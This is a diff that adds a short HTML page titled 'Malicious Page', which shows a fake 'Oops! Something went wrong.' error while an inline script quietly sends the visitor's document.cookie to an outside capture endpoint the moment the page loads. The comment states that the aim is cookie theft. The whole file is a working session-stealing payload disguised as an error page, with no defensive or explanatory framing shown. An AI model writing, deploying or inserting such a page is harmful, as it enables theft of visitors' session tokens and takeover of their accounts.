@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Page</title>
+</head>
+<body>
+    <h1>Oops! Something went wrong.</h1>
+    <script>
+        // Steal cookies and send them to your server
+        fetch('https://boogeyman.free.beeceptor.com/steal?token=' + document.cookie);
+    </script>
+</body>
+</html>
